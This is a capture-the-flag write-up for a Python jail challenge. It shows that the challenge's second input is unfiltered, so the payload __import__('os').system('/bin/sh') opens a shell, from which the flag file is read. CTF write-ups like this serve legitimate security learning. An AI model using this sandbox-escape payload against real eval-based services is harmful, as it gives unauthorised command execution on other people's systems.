# unnecessary

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/2c8c5405-c7d5-4d22-bab0-7a3ea0666d80)

sample entering
```
quasar@quasar098:~$ nc chal.nbctf.com 31381
pyjails really shouldn't be guessy, but this one is.
>>> hello world
guess harder
```

## solution

so, we can try entering no text (just pressing enter key)

```
quasar@quasar098:~$ nc chal.nbctf.com 31381
pyjails really shouldn't be guessy, but this one is.
>>>
invalid syntax (<string>, line 0)
i kinda feel bad, so i'll let you have another try.
>>>
error, guess harder!
```

it gives us the opportunity to do a second try

```
quasar@quasar098:~$ nc chal.nbctf.com 31381
pyjails really shouldn't be guessy, but this one is.
>>>
invalid syntax (<string>, line 0)
i kinda feel bad, so i'll let you have another try.
>>> __import__('os').system("/bin/sh")
ls
flag.txt
run
cat flag.txt
nbctf{th15_15_4ll_th3_fr0g5_f4ul7}
```

for some reason, the second try just doesn't have any protections

my original solution was to do
```
pyjails really shouldn't be guessy, but this one is.
>>> {ᵉᵛᵃˡ:=ᵉˣᵉᶜ}=={ʳᵃⁿᵍᵉ}
i kinda feel bad, so i'll let you have another try.
>>> __import__('os').system("/bin/sh")
$ ls
flag.txt
run
$ cat flag.txt
```

idk why i thought this would work but it is pretty clever but idk lol yeah
